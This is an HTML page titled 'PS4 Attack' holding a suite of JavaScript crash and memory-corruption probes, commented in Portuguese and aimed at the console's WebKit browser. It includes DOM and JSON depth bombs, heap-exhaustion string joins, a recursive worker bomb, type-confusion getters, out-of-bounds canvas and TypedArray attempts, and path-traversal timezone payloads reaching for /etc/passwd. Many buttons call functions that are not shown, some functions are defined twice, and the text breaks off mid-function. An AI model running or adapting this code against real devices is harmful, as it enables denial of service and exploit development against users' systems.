<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
   <title>PS4 Attack</title>
   </head>
<body>

  <h1>ATTACK SUITE 2</h1>

    <button onclick="startDOMRecursion()">HACKERONE TRIGGER CRASH</button>
    <button onclick="runStringAttack()">HACKERONE STRING FLATTENING</button>
	
    <button onclick="runArrayShift()">PROMISSOR Array Shift Fast-Path Bailout</button>
	<button onclick="runBindChain()">PROMISSOR Function.bind() Chain Reaction</button>
	<button onclick="runCollationCrash()">PROMISSOR Locale Collation Stack Smash</button>
	<button onclick="runMicrotaskBomb()">PROMISSOR Promise Microtask Starvation</button>
    <button onclick="runUnwindSmash()">PROMISSOR Exception Unwinder Stack Smash</button>
	<button onclick="runReplaceBomb()">MEMORIA String.replace Calculation Overflow</button>
    <button onclick="run10_AllocPanic()">MEMORIA Bad Array New Length</button>
    <button onclick="runZombieWindow()">PROMISSOR Zombie Iframe Access</button>
	<button onclick="run10_CSSNth()">PROMISSOR CSS nth-child() Recursion</button>
    <button onclick="runShapeShift()">PROMISSOR Object Shape Transition Race (Type Confusion)</button>
    <button onclick="runGCReentrancy()">PROMISSOR Array Buffer Detach via GC Side-Effect</button>
	<button onclick="runSortSideEffect()">PROMISSOR Array Sort Side-Effect (qsort)</button>
    <button onclick="runBadArrayLength()">PROMISSOR Bad Array Length (Integer Overflow)</button>
	
    <button onclick="runCanvasOverflow()">Canvas GetImageData Integer Overflow</button>
    <button onclick="runJSONBomb()">JSON.parse Depth Bomb</button>
   
    <button onclick="runURIBomb()">DecodeURIComponent Buffer Overflow</button>
    <button onclick="runSegmenterOOM()">Intl.Segmenter Allocator Panic</button>
    <button onclick="runTypedArrayWrap()">TypedArray Offset Wraparound</button>
    <button onclick="runThreadBomb()">Recursive Worker Bomb (Thread Limit)</button>
    <button onclick="runCryptoPanic()">Crypto RNG Deadlock (Driver Hang)</button>
    <button onclick="runBitmapCrash()">ImageBitmap Allocator Panic</button>
    <button onclick="runCloneBomb()">History State Mutator (Serializer Crash)</button>
    <button onclick="runCanvasOOB()">Canvas putImageData OOB Write</button>
    <button onclick="runBlobNest()">Recursive Blob Reference Panic</button>
    <button onclick="runTypeConfusion()">Array Type Confusion (The Butterfly)</button>
    <button onclick="runAXCrash()">Accessibility Tree UAF</button>
    <button onclick="runWorkerBlobRace()">Worker FileReaderSync Race</button>
    <button onclick="runFutureRace()">C++ Future/Promise Race (std::terminate)</button>
    <button onclick="runTimezoneAttack()">Zoneinfo Path Traversal / Overflow</button>
    
    <button onclick="runJSONBomb()">JSON Nesting Bomb (Stack Overflow)</button>
    <button onclick="runSVGPathCrash()">SVG Path Buffer Overflow</button>
    <button onclick="runURLCrash()">URL Scheme Overflow</button>
    <button onclick="runNotificationBomb()">Notification Daemon Overflow</button>
    <button onclick="runGlyphFlood()">Font Cache Exhaustion (Unicode Flood)</button>
    <button onclick="runPatternRace()">Canvas Pattern Use-After-Free</button>
    <button onclick="runHTMLRecursion()">HTML Parser Stack Overflow (Div Bomb)</button>
    <button onclick="runCSSCalcBomb()">CSS calc() Nested Explosion</button>
    <button onclick="runSVGFilterChain()">SVG Filter Chain Exhaustion</button>
    <button onclick="runFloatBomb()">Float Parse Stack Overflow (Dtoa)</button>
    <button onclick="runTextShaper()">Font Shaper Memory Corruption</button>
    <button onclick="runLayerExplosion()">Compositing Layer Exhaustion</button>
    <button onclick="runUnicodeBomb()">Unicode Normalization Overflow</button>
    <button onclick="runIntlLogicError()">Intl.NumberFormat Type Confusion</button>
    <button onclick="runDateLogicCrash()">Date.parse Integer Underflow</button>
    <button onclick="runGhostDate()">Date Integer Overflow & DST Gap</button>
    <button onclick="runRegexFolding()">Regex Unicode Expansion (Buffer Mismatch)</button>
    <button onclick="runURIPoison()">URI Component Lone Surrogate Decoding</button>
    <button onclick="runRegexSticky()">RegExp Sticky Flag State Desync</button>
    <button onclick="runJSONReviver()">JSON Reviver Object Corruption</button>
    <button onclick="runDateProxy()">Date Proxy Type Confusion</button>
    
    <button onclick="runNullByteURI()">URI Null Byte Poisoning (%00)</button>
    
    <button onclick="runPrecisionCrash()">Number Precision Stack Smash</button>
    <button onclick="runEventPathUAF()">Event Path Destruction (UAF)</button>
    <button onclick="runBlobSliceCrash()">Blob Slice 64-bit Overflow</button>

    <button onclick="runMatrixCrash()">CSS Matrix3D Singular Overflow</button>
    <button onclick="runXSLTSort()">XSLT Sort Type Confusion</button>
    <button onclick="runMSERace()">MediaSource Buffer Race (UAF)</button>
    <button onclick="runCurrencyBomb()">Currency Formatting Overflow</button>

    <button onclick="runUnwindStress()">Exception Unwind Stack Smash</button>
    <button onclick="runUpgradeRace()">TEST 1: Custom Element Upgrade Race (UAF)</button>
    <button onclick="runCSSMathCrash()">TEST 2: CSS Trigonometry Infinity Crash</button>
    <button onclick="runRangeCorruption()">TEST 3: DOM Range Extract Corruption</button>
    <button onclick="runNormalizeUAF()">TEST 1: DOM Normalize Mutation Race</button>
    <button onclick="runSelectCycle()">TEST 2: Recursive Select/Option Crash</button>
    <button onclick="runLinkStateRace()">TEST 3: Link Rel Attribute State Confusion</button>
        <button onclick="run1_NullByte()">1. URI Null Byte (%00)</button>
        <button onclick="run2_RegexReDoS()">2. Regex Complexity (ReDoS)</button>
        <button onclick="run3_SortProxy()">3. Array Sort Proxy Mutation</button>
        <button onclick="run4_DateOverflow()">4. Date Integer Overflow</button>
        <button onclick="run5_IntlCrash()">5. Intl Locale Stack Smash</button>
        <button onclick="run6_DecoderStream()">6. TextDecoder Stream Split</button>
        <button onclick="run7_BlobUnderflow()">7. Blob Slice Underflow</button>
        <button onclick="run8_JSONReviver()">8. JSON Reviver UAF</button>
        <button onclick="run9_UnwindBomb()">9. Stack Unwind Recursion</button>
     
        <button onclick="run1_SelectionUAF()">1. Selection API UAF</button>
        <button onclick="run2_DragDrop()">2. Drag & Drop State Confusion</button>
        <button onclick="run3_CanvasPattern()">3. Canvas Pattern Destruction</button>
        <button onclick="run4_FontIter()">4. FontFaceSet Iterator Invalid.</button>
        <button onclick="run5_XSLTRecurse()">5. XSLT document() Recursion</button>
        <button onclick="run6_WorkerChannel()">6. Worker MessageChannel Race</button>
        <button onclick="run7_SMILCrash()">7. SVG SMIL Animation Race</button>
        <button onclick="run8_BlobRevoke()">8. Blob URL Async Revoke</button>
        <button onclick="run9_DocWrite()">9. Iframe document.write() Logic</button>
        
    <button onclick="runGeneratorSmash()">TEST 3: Async Generator State Corruption</button>
    <button onclick="runResizeLoop()">TEST 1: ResizeObserver Loop Bypass</button>
    <button onclick="runZombieBlob()">TEST 2: Iframe Blob Reload Race (UAF)</button>
    <button onclick="runMediaFlood()">TEST 3: matchMedia Listener Flood</button>
    <button onclick="runAdoptionUAF()">TEST 1: HTML Parser Adoption Agency UAF</button>
    <button onclick="runSpliceTrap()">TEST 2: Array.splice Proxy Trap (OOB Write)</button>
    <button onclick="runMapIterator()">TEST 3: Map Iterator Invalidation Crash</button>
    <button onclick="runDictionaryTransition()">TEST 1: Dictionary Mode Transition (Type Confusion)</button>
    <button onclick="runArrayFromTrap()">TEST 2: Array.from Iterator Resize Trap</button>
    <button onclick="runRegexIndexOverflow()">TEST 3: RegExp lastIndex Integer Overflow</button>
    <button onclick="runCSSAtomBomb()">TEST 1: CSS Variable Exponential Expansion (The Atom Bomb)</button>
    <button onclick="runStructureIDExhaustion()">TEST 2: JSC StructureID Table Exhaustion</button>
    <button onclick="runNamespaceConfusion()">TEST 3: SVG/HTML Namespace Recursion</button>

  

    <div id="log">Status: Aguardando testes...</div>
    <canvas id="c" width="100" height="100"></canvas>

    <script>
        function log(msg) { 
            document.getElementById('log').innerText = `> ${msg}\n` + document.getElementById('log').innerText;
        }
function log(msg) {
            document.getElementById('log').innerText += "\n" + msg;
        }

        function startDOMRecursion() {
            log("Iniciando ataque de Profundidade DOM...");
            setTimeout(() => {
                try {
                    let root = document.createElement('div');
                    document.body.appendChild(root);
                    let count = 0;
                    
                    function dive() {
                        count++;
                        let child = document.createElement('div');
                        // Adiciona texto para forçar renderização e layout calculation
                        child.innerText = "."; 
                        root.appendChild(child);
                        root = child; // Desce um nível
                        
                        // Loga a cada 1000 para não travar a UI antes da hora
                        if (count % 1000 === 0) log(`Profundidade atual: ${count}`);
                        
                        dive(); // Recursão
                    }
                    dive();
                } catch (e) {
                    log("Erro capturado (Browser tentou proteger): " + e);
                    log("Tentando método alternativo (String Repeat)...");
                    // Método fallback do seu script original
                    document.body.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
                }
            }, 500);
        }
function runStringAttack() {
            log("Fase 1: Criando Array Fragmentado...");
            
            setTimeout(() => {
                try {
                    // Cria um array com milhares de strings de 10MB cada
                    // Isso fragmenta a Heap rapidamente
                    var hugeArray = [];
                    var chunk = new Array(1024 * 1024).join("A"); // ~1MB String
                    
                    for(let i=0; i < 2000; i++) {
                        hugeArray.push(chunk);
                        if(i % 200 === 0) log("Alocado: " + i + "MB");
                    }

                    log("Fase 2: O ACHATAMENTO (The Flattening)...");
                    log("Atenção: O navegador deve travar agora.");

                    // O GOLPE FINAL:
                    // .join('') força o WebKit a pegar todas as peças espalhadas
                    // e tentar colocá-las num bloco ÚNICO e GIGANTE de memória.
                    // A maioria dos sistemas não tem um bloco contínuo desse tamanho livre.
                    var flatString = hugeArray.join("");
                    
                    // Se sobreviveu, vamos tentar manipular para garantir que a memória foi escrita
                    log("Tamanho final: " + flatString.length);
                    var upper = flatString.toUpperCase(); // Força cópia (2x memória)
                    
                } catch(e) {
                    log("Erro (Browser Protegeu): " + e.message);
                    log("Tentando Loop Infinito de Histórico como 'Plano B'...");
                    
                    // Plano B: History Flooding (Trava a UI do sistema)
                    for(let i=0; i<100000; i++) {
                        history.pushState(0,0, i.toString());
                    }
                }
            }, 100);
        }

	 function runBadArrayLength() {
            log("Testando Array Length Integer Overflow...");
            
            // Valores limítrofes para 32-bit signed/unsigned
            const sizes = [
                0xFFFFFFFF, 
                0x80000000, 
                0x7FFFFFFF,
                -1,
                4294967295, // Max Uint32
                4294967296  // Overflow
            ];

            sizes.forEach(size => {
                try {
                    log(`Tentando alocar Uint8Array(${size})...`);
                    // Se o cálculo de tamanho (size * bytes) der overflow, pode alocar pouco e escrever muito
                    let arr = new Uint8Array(size);
                    log("Alocado (Inesperado!)");
                } catch(e) {
                    // RangeError é normal. Estamos procurando Crash ou InternalError.
                }
            });
            log("Teste de Array finalizado.");
        }

        // --- TESTE 1: Canvas GetImageData Integer Overflow ---
        // Tenta enganar o cálculo de tamanho do buffer de pixels.
        // Alvo: (w * h * 4) causando overflow em 32-bit.
        function runCanvasOverflow() {
            log("Iniciando Canvas Integer Overflow Check...");
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');
            
            // Dimensões que, multiplicadas por 4, excedem 2^32 (4GB)
            // 32768 * 32768 * 4 = 4,294,967,296 (0 em 32-bit)
            // Tentamos um valor "seguro" para alocação 2D, mas fatal para o buffer linear
            const hugeSide = 65536; 
            
            try {
                log(`Solicitando buffer de imagem: ${hugeSide}x10...`);
                // Isso deveria falhar com "Out of Memory" ou "InvalidStateError"
                // Se crashar, o cálculo de tamanho "deu a volta" e tentou ler memória inválida.
                const data = ctx.getImageData(0, 0, hugeSide, 10);
                log("Buffer alocado (Inesperado, tamanho: " + data.data.length + ")");
                
                log("Tentando overflow massivo (Pode travar)...");
                // Tenta provocar o overflow aritmético exato
                const overflowData = ctx.getImageData(0, 0, 32768, 32768); 
                log("Sobreviveu ao Overflow.");
                
            } catch(e) {
                log("Erro Canvas (Protegido): " + e.message);
            }
        }

        // --- TESTE 2: JSON.parse Depth Bomb ---
        // O parser JSON usa recursão C++. O limite de pilha do PS4 é baixo.
        // Criamos uma string JSON válida, mas absurdamente profunda.
        function runJSONBomb() {
            log("Gerando JSON Depth Bomb...");
            
            setTimeout(() => {
                try {
                    const depth = 5000; // Profundidade alta
                    log(`Construindo JSON com profundidade ${depth}...`);
                    
                    // Cria '[[[[...]]]]'
                    const jsonString = "[".repeat(depth) + "1" + "]".repeat(depth);
                    
                    log("Parseando (Isso deve estourar a Stack C++)...");
                    const obj = JSON.parse(jsonString);
                    
                    log("JSON parseado com sucesso (Stack robusta).");
                } catch(e) {
                    log("Erro JSON: " + e.message);
                    if (e.message.toLowerCase().includes("stack")) {
                        log("SUCESSO: Stack Overflow detectado no JSON Parser!");
                    }
                }
            }, 100);
        }

        // --- TESTE 3: Function.bind() Chain Reaction ---
        // Cria uma cadeia de funções ligadas (bound functions).
        // A execução força o motor a desempilhar contextos infinitamente.
        function runBindChain() {
            log("Criando cadeia Function.bind()...");
            
            try {
                let func = function() { return "pow"; };
                
                // Encadeia .bind() 50.000 vezes
                // Isso cria 50.000 objetos na memória ligados entre si
                for (let i = 0; i < 50000; i++) {
                    func = func.bind(null);
                }
                
                log("Cadeia criada. Executando (Trigger)...");
                
                // O gatilho: Chamar a função final
                // O WebKit tem que resolver a cadeia inteira de uma vez
                func();
                
                log("Bind Chain executada (Sem crash).");
                
            } catch(e) {
                log("Erro Bind: " + e.message);
                if (e.message.includes("stack")) {
                    log("SUCESSO: Stack Overflow via Bind Chain!");
                }
            }
        }
       
        function runURIBomb() {
            log("Iniciando URI Decode Attack...");
            
            try {
                // Cria uma string gigante de caracteres codificados
                // O navegador precisa alocar um buffer temporário para converter isso.
                // Sequências % repetidas podem confundir o cálculo de tamanho do buffer de destino.
                const part = "%C0%AF".repeat(50000); // Caracteres 'overlong' inválidos
                const hugeURI = part + part + part;
                
                log("Decodificando URI de " + hugeURI.length + " bytes...");
                
                // Se o cálculo de tamanho falhar (Integer Overflow), ele aloca pouco e escreve muito.
                const result = decodeURIComponent(hugeURI);
                
                log("Decode sobreviveu (Length: " + result.length + ")");
            } catch(e) {
                log("Erro URI: " + e.message);
                if (e.message.includes("URI")) {
                    log("Nota: Erro de URI padrão. Procuramos Crash.");
                }
            }
        }

        // --- TESTE 2: Intl.Segmenter Allocator Panic ---
        // A API Intl.Segmenter (nova no Safari 17 base) é complexa.
        // Ela precisa criar um iterador sobre o texto. Vamos tentar forçar o erro "Bad Array New Length".
        function runSegmenterOOM() {
            log("Atacando Intl.Segmenter (Heap Allocation)...");
            
            if (!window.Intl || !Intl.Segmenter) {
                log("Intl.Segmenter não suportado.");
                return;
            }

            try {
                // Cria uma string maciça
                const blob = new Array(1024 * 1024 * 10).join("A "); // 20MB
                
                const segmenter = new Intl.Segmenter("en", {granularity: "word"});
                log("Segmentando string gigante...");
                
                // O iterador pode tentar alocar um array de índices internamente.
                // Se a string for grande demais, o tamanho do array de índices pode estourar 32-bit.
                const segments = segmenter.segment(blob);
                
                // Força a leitura para efetivar a alocação
                let count = 0;
                for (const seg of segments) {
                    count++;
                    if (count > 1000) break; // Só para testar o início
                }
                
                log("Segmentação iniciada sem crash.");
                
            } catch(e) {
                log("Erro Segmenter: " + e.message);
            }
        }

        // --- TESTE 3: TypedArray Offset Wraparound ---
        // Explora o cálculo de ponteiros: (Base + Offset).
        // Se passarmos um offset negativo (que em 32-bit é um número gigante),
        // o cálculo pode "dar a volta" (Wrap Around) e apontar para memória antes do buffer.
        function runTypedArrayWrap() {
            log("Testando TypedArray Offset Wraparound...");
            
            try {
                const buffer = new ArrayBuffer(1024);
                
                // Vetores de ataque para Offset:
                // -1  (0xFFFFFFFF em 32-bit)
                // -4  (Para alinhamento de Int32)
                // MaxSafeInteger
                const offsets = [-1, -4, 4294967292, 2147483644];
                
                offsets.forEach(off => {
                    try {
                        // Tenta criar uma view que aponta para (Buffer + Offset Gigante)
                        // Se o sistema somar sem checar, pode acessar memória proibida.
                        const view = new Uint32Array(buffer, off, 1);
                        log(`ALERTA: View criada com offset ${off}! Leitura OOB possível.`);
                        log("Valor lido: " + view[0]);
                    } catch(e) {
                        // Erro esperado se a proteção funcionar
                    }
                });
                
                log("Teste de Offset finalizado.");
                
            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }
function runThreadBomb() {
            log("Iniciando Bomba de Threads Recursiva...");
            
            const workerScript = `
                try {
                    // Tenta criar sub-worker imediatamente
                    const blob = new Blob(["(" + arguments.callee.toString() + ")()"], {type: "text/javascript"});
                    const url = URL.createObjectURL(blob);
                    new Worker(url);
                    
                    // Mantém a thread viva e ocupada
                    setInterval(() => { Math.random() }, 100);
                } catch(e) {
                    postMessage("Fim da linha: " + e.message);
                }
            `;

            const blob = new Blob([workerScript], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            
            // Lança 10 raízes para acelerar o processo
            for(let i=0; i<10; i++) {
                new Worker(url);
            }
            log("Raízes lançadas. O sistema deve ficar lento ou travar.");
        }

        // --- TESTE 2: Crypto RNG Deadlock ---
        // Ataca o driver /dev/random identificado no libkernel.
        // Pede quantidades obscenas de dados criptográficos.
        function runCryptoPanic() {
            log("Solicitando Entropia Massiva ao Kernel...");
            
            if (!window.crypto) {
                log("Crypto API não suportada.");
                return;
            }

            try {
                // Tenta alocar buffers no limite de 32-bit
                const sizes = [
                    1024 * 1024 * 10, // 10MB (Aquecimento)
                    1024 * 1024 * 100, // 100MB
                    500 * 1024 * 1024  // 500MB (Perigoso para o driver)
                ];

                sizes.forEach(size => {
                    setTimeout(() => {
                        try {
                            log(`Pedindo ${size / 1024 / 1024}MB de aleatoriedade...`);
                            const buf = new Uint8Array(size);
                            // Esta chamada bloqueia até o kernel ter entropia suficiente
                            window.crypto.getRandomValues(buf);
                            log("Sucesso (Kernel gerou a entropia).");
                        } catch(e) {
                            log(`Falha (${size}): ` + e.message);
                        }
                    }, 100);
                });

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        // --- TESTE 3: ImageBitmap Allocator Panic ---
        // Ataca o alocador de gráficos "SeaFood".
        // Tenta criar um bitmap que excede a memória de vídeo ou estoura o cálculo de tamanho.
        function runBitmapCrash() {
            log("Iniciando ImageBitmap Overflow...");
            
            // Cria um blob pequeno (fonte)
            const canvas = document.createElement('canvas');
            canvas.width = 1;
            canvas.height = 1;
            
            canvas.toBlob(blob => {
                if (!blob) { log("Erro ao criar blob."); return; }

                // Tenta redimensionar para tamanhos absurdos durante a decodificação
                const sizes = [
                    {w: 65535, h: 65535},   // 4GB raw (Estouro de 32-bit?)
                    {w: 100000, h: 100000}, // 40GB (Impossível)
                    {w: -1, h: -1}          // Valores negativos
                ];

                sizes.forEach(dim => {
                    log(`Tentando criar Bitmap: ${dim.w}x${dim.h}...`);
                    
                    createImageBitmap(blob, 0, 0, 1, 1, {
                        resizeWidth: dim.w,
                        resizeHeight: dim.h,
                        resizeQuality: 'high'
                    })
                    .then(bmp => {
                        log("Bitmap criado! (Isso não deveria acontecer)");
                        bmp.close();
                    })
                    .catch(e => {
                        log("Erro capturado: " + e.message);
                        // "Out of Memory" aqui é bom. "System Error" é melhor.
                    });
                });
            });
        }
function runCloneBomb() {
            log("Iniciando ataque ao Structured Clone...");
            
            try {
                const complexObj = {
                    a: 1,
                    b: 2,
                    // Getter malicioso
                    get c() {
                        log("C++ leu a propriedade 'c'. Mutando objeto...");
                        // O GOLPE: Deleta propriedades e altera tipos para invalidar o layout de memória
                        delete this.a;
                        delete this.b;
                        this.d = new Array(1000).fill(1.1); // Array de doubles
                        this.e = "LIXO NA MEMORIA";
                        return 0x41414141;
                    }
                };

                // Tenta salvar no histórico. O WebKit precisa serializar 'complexObj'.
                history.pushState(complexObj, "Crash", "");
                log("Serializer sobreviveu.");

            } catch(e) {
                log("Erro Serializer (Seguro): " + e.message);
            }
        }

        // --- TESTE 2: Canvas putImageData OOB ---
        // Ataca a função interna de cópia de pixels.
        // Manipula os parâmetros de 'dirty rect' para tentar enganar a verificação de limites.
        function runCanvasOOB() {
            log("Iniciando Canvas Memory Copy Attack...");
            
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            
            // Cria um buffer de pixels pequeno
            const data = new Uint8ClampedArray(400); // 10x10 pixels
            const imgData = new ImageData(data, 10, 10);
            
            const vectors = [
                // dx, dy, dirtyX, dirtyY, dirtyW, dirtyH
                [0, 0, 0, 0, 1000, 1000],      // Dirty rect maior que a imagem
                [0, 0, 0xFFFFFF, 0, 10, 10],   // DirtyX gigante (Integer overflow?)
                [0, 0, -1, 0, 10, 10],         // Negativo
                [0, 0, 0, 0, 0xFFFFFFFF, 10]   // Largura dirty negativa/gigante
            ];

            vectors.forEach((v, i) => {
                try {
                    log(`Tentativa ${i}: putImageData com parâmetros tóxicos...`);
                    // Tenta escrever memória fora do canvas
                    ctx.putImageData(imgData, v[0], v[1], v[2], v[3], v[4], v[5]);
                    log("Comando aceito (Verifique corrupção visual).");
                } catch(e) {
                    // Erros de IndexSizeError são normais.
                    // Estamos procurando o crash silencioso.
                }
            });
        }

        // --- TESTE 3: Recursive Blob Reference Panic ---
        // Cria uma cadeia de Blobs apontando uns para os outros.
        // O sistema precisa resolver essa cadeia para ler os dados.
        function runBlobNest() {
            log("Criando Ninho de Blobs Recursivo...");
            
            try {
                let root = new Blob(["START"]);
                
                // Envolve o blob em camadas repetidamente
                for(let i=0; i<2000; i++) {
                    // Array misto de strings e blobs força lógica complexa de concatenação
                    root = new Blob([root, "padding", root]);
                }
                
                log("Blob criado. Tamanho virtual gigantesco.");
                
                // Tenta ler (FileReader). Isso força o 'flattening' da estrutura de blobs.
                const reader = new FileReader();
                reader.onload = () => log("Leitura concluída (Seguro).");
                reader.onerror = () => log("Erro de leitura.");
                
                // O GOLPE: A leitura pode estourar a pilha de recursão interna do BlobRegistry
                reader.readAsText(root);
                
            } catch(e) {
                log("Erro Blob: " + e.message);
            }
        }
function runTypeConfusion() {
            log("Iniciando Array Type Confusion...");
            
            try {
                // Cria array de doubles (Float64)
                let arr = [1.1, 2.2, 3.3];
                
                // Define um getter na propriedade 'constructor' ou 'species'
                // O WebKit consulta isso para saber que tipo de array criar como resultado
                Object.defineProperty(arr, "constructor", {
                    get: () => {
                        log("Engine acessou 'constructor'. Convertendo Array...");
                        
                        // O GOLPE: Transforma o array de Doubles em Array de Objetos
                        // Isso muda o layout da memória (Butterfly)
                        arr[0] = {}; 
                        
                        // Retorna um construtor que engana o motor
                        return Array;
                    }
                });

                // concat() aciona o getter
                log("Executando concat()...");
                let result = arr.concat([4.4]);
                
                log("Resultado (Length): " + result.length);
                log("Verifique se o valor 1.1 foi corrompido.");

            } catch(e) {
                log("Erro Type Confusion: " + e.message);
            }
        }

        // --- TESTE 2: Accessibility (AX) Tree UAF ---
        // Força a criação de objetos de acessibilidade e os remove.
        // O WebKit tem um histórico longo de bugs aqui.
        function runAXCrash() {
            log("Construindo Árvore de Acessibilidade (ARIA)...");
            const root = document.getElementById('ax-root');
            root.innerHTML = "";
            
            // Cria estrutura complexa com ARIA
            let content = "";
            for(let i=0; i<500; i++) {
                // 'aria-flowto' cria referências cruzadas na árvore C++
                content += `<div id="el${i}" role="button" aria-label="test" aria-flowto="el${i+1}">X</div>`;
            }
            root.innerHTML = content;

            // Força o navegador a calcular a acessibilidade (focando elementos)
            setTimeout(() => {
                log("Ativando AXObjectCache...");
                const el = document.getElementById('el100');
                if(el) el.focus(); // Dispara eventos de foco para o sistema
                
                // O GOLPE: Destruição em massa durante o processamento de eventos
                setTimeout(() => {
                    log("Destruindo DOM (Trigger UAF)...");
                    root.innerHTML = "<b>GONE</b>";
                    
                    // Tenta forçar garbage collection e atualização da árvore AX
                    // Criando e removendo iframes (que têm suas próprias árvores AX)
                    let ifr = document.createElement('iframe');
                    document.body.appendChild(ifr);
                    document.body.removeChild(ifr);
                    
                }, 100);
            }, 100);
        }

        // --- TESTE 3: Worker FileReaderSync Race ---
        // Usa FileReaderSync (exclusivo de Workers) para ler um Blob que está morrendo.
        function runWorkerBlobRace() {
            log("Iniciando FileReaderSync Race...");
            
            // 1. Cria um Blob grande
            const blob = new Blob([new Array(1024*1024).join("A")], {type: "text/plain"});
            
            // 2. Código do Worker
            const workerCode = `
                onmessage = function(e) {
                    try {
                        const blob = e.data;
                        // Leitura Síncrona (Bloqueia a thread do Worker)
                        const reader = new FileReaderSync();
                        const txt = reader.readAsText(blob);
                        postMessage("Lido: " + txt.length);
                    } catch(err) {
                        postMessage("Erro Worker: " + err.message);
                    }
                };
            `;
            const workerUrl = URL.createObjectURL(new Blob([workerCode], {type: 'application/javascript'}));
            
            // Lança múltiplos workers para aumentar a chance de colisão
            for(let i=0; i<5; i++) {
                const w = new Worker(workerUrl);
                w.onmessage = (e) => log(e.data);
                
                // Envia o blob
                w.postMessage(blob);
                
                // O GOLPE: Revoga a URL ou tenta neutrar o blob imediatamente
                // O FileReaderSync no worker pode tentar ler memória que a main thread já marcou como livre
                // Nota: Blob puro é difícil de revogar, mas se fosse File ou stream seria mais fácil.
                // Tentamos terminar o worker no meio da leitura.
                setTimeout(() => {
                    w.terminate();
                }, 5); // Tempo crítico
            }
            
            log("Workers lançados e terminados.");
        }
function runFutureRace() {
            log("Iniciando corrida de std::future...");
            
            let count = 0;
            const max = 1000;
            
            const interval = setInterval(() => {
                count++;
                if (count > max) {
                    clearInterval(interval);
                    log("Teste de Futures finalizado.");
                    return;
                }

                try {
                    const controller = new AbortController();
                    const signal = controller.signal;
                    
                    // Inicia uma operação de rede que cria uma Promise/Future interna
                    fetch("/", { signal }).catch(e => {});
                    
                    // O GOLPE: Aborta IMEDIATAMENTE.
                    // Tenta fazer o sistema cancelar a Future enquanto ela ainda está sendo criada.
                    // Isso pode causar "broken promise" no C++.
                    controller.abort();
                    
                    // Tenta abortar novamente para forçar Double-Free lógico
                    controller.abort();
                    
                } catch(e) {}
                
                if (count % 100 === 0) log(`Ciclos de Abort: ${count}`);
            }, 5);
        }

        // --- TESTE 2: Zoneinfo Path Traversal / Overflow ---
        // Ataca o carregador de "/usr/share/zoneinfo".
        // Tenta passar caminhos relativos ou buffers gigantes como Timezone ID.
        function runTimezoneAttack() {
            log("Atacando banco de dados de Fuso Horário...");
            
            const payloads = [
                "../../../../../../../../dev/random", // Tenta carregar dispositivo como arquivo de zona
                "../".repeat(100) + "etc/passwd",
                "A".repeat(10000), // Buffer Overflow no caminho
                "Factory", // Zonas antigas
                "SystemV/AST4ADT"
            ];

            payloads.forEach(tz => {
                try {
                    log(`Tentando setar fuso horário: ${tz.substring(0, 30)}...`);
                    
                    // O construtor Intl.DateTimeFormat valida o ID.
                    // Se a validação falhar mas passar algo sujo para o C++, pode crashar.
                    const fmt = new Intl.DateTimeFormat("en-US", {
                        timeZone: tz
                    });
                    
                    // Força o uso
                    fmt.format(new Date());
                    
                } catch(e) {
                    // Erros de "Invalid time zone" são esperados (proteção JS).
                    // Estamos procurando o caso onde o JS aceita mas o C++ crasha.
                    if (!e.message.includes("Invalid time zone")) {
                        log(`ALERTA: Erro incomum para ${tz}: ${e.message}`);
                    }
                }
            });
        }

        // --- TESTE 3: Locale Collation Stack Smash ---
        // Ataca a função "strxfrm" (String Transform) da libc.
        // Compara strings gigantes usando regras de ordenação complexas.
        function runCollationCrash() {
            log("Iniciando Collation Stack Smash...");
            
            try {
                // Cria strings que exigem muita expansão durante a comparação
                // Caracteres acentuados e emojis aumentam o tamanho do buffer interno
                const strA = "\u0301".repeat(50000); // Combining Diacritics
                const strB = "\u0301".repeat(50001);
                
                log("Comparando strings complexas (50k chars)...");
                
                // Usa um locale que tem regras complexas (ex: Alemão Phonebook ou Húngaro)
                // Isso força o uso de tabelas de colação pesadas na libc
                const result = strA.localeCompare(strB, "de-DE-u-co-phonebk", {
                    sensitivity: "variant",
                    usage: "sort"
                });
                
                log("Comparação concluída: " + result);
                
            } catch(e) {
                log("Erro Collation: " + e.message);
            }
        }
function runJSONBomb() {
            log("Gerando Bomba JSON Recursiva...");
            
            setTimeout(() => {
                try {
                    const depth = 10000; // Profundidade agressiva
                    let jsonStr = "";
                    
                    // Abre chaves: {"a":{"a":...
                    for(let i=0; i<depth; i++) jsonStr += '{"a":';
                    jsonStr += "1";
                    // Fecha chaves
                    for(let i=0; i<depth; i++) jsonStr += "}";
                    
                    log(`JSON gerado (Length: ${jsonStr.length}). Parseando...`);
                    
                    // O Gatilho: O parser C++ tenta navegar a profundidade
                    const obj = JSON.parse(jsonStr);
                    
                    log("Parser JSON sobreviveu.");
                    
                    // Tenta o inverso: Stringify de objeto profundo (se o parse passou)
                    log("Tentando stringify...");
                    JSON.stringify(obj);
                    
                } catch(e) {
                    log("Erro JSON (Handled): " + e.message);
                }
            }, 100);
        }

        // --- TESTE 2: SVG Path Buffer Overflow ---
        // Cria um caminho SVG com milhões de comandos.
        // Tenta forçar um Integer Overflow no cálculo do tamanho do buffer de pontos.
        function runSVGPathCrash() {
            log("Gerando SVG Path Monstruoso...");
            
            setTimeout(() => {
                try {
                    // Cria uma string de caminho gigante: "M 0 0 L 1 1 L 2 2 ..."
                    // Usa array join para ser rápido e economizar memória JS
                    const points = new Array(200000).join(" L 100 100"); 
                    const pathData = "M 0 0" + points;
                    
                    log(`Injetando Path (${pathData.length} bytes)...`);
                    
                    const ns = "http://www.w3.org/2000/svg";
                    const svg = document.createElementNS(ns, "svg");
                    const path = document.createElementNS(ns, "path");
                    
                    // O Parser de atributos roda aqui
                    path.setAttribute("d", pathData);
                    
                    svg.appendChild(path);
                    document.getElementById("hidden-area").appendChild(svg);
                    
                    // Força o navegador a processar a geometria (Get BBox)
                    // Isso obriga o C++ a ler todos os pontos do buffer
                    log("Calculando geometria...");
                    path.getBBox();
                    
                    log("SVG Path processado com sucesso.");
                    document.getElementById("hidden-area").innerHTML = ""; // Limpa
                    
                } catch(e) {
                    log("Erro SVG: " + e.message);
                }
            }, 100);
        }

        // --- TESTE 3: URL Scheme Overflow ---
        // Tenta criar um objeto URL com componentes que excedem limites internos.
        // O libc tem strings como "string too long" para URLs.
        function runURLCrash() {
